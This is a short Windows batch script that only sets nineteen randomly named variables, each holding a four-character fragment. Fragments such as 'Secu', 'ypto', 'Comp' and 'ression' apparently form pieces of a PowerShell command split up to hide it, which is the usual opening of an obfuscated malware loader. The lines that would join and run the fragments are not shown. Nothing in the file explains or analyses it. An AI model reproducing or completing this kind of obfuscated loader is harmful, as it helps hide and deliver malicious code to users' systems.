@echo off
set "eWgZqkZiAV=tsWi"
set "sJndmDjjmZ=$XGd"
set "CfdkYGXpgB=TllA"
set "deAvSEpZNb=ode]"
set "ZeiNHskfza=6esa"
set "ohoGwTpgxK=ring"
set "eggNzAzLKj=ne);"
set "cUmgrnPsZE=Comp"
set "rUsWblKcTQ=g = "
set "oFAAbQVQIf=ypto"
set "BZqPAImgRN=ionM"
set "miSSIoVIrF=Secu"
set "TkzvFpnHTS=$oZF"
set "YzNCBAqMxZ=1] -"
set "ayMttCgWYP=FP);"
set "dANSxRNcXE= New"
set "bhYgkvFRUY=sion"
set "RDhEZIepDH=]::N"
set "tQKnYNLImi=vNDD"
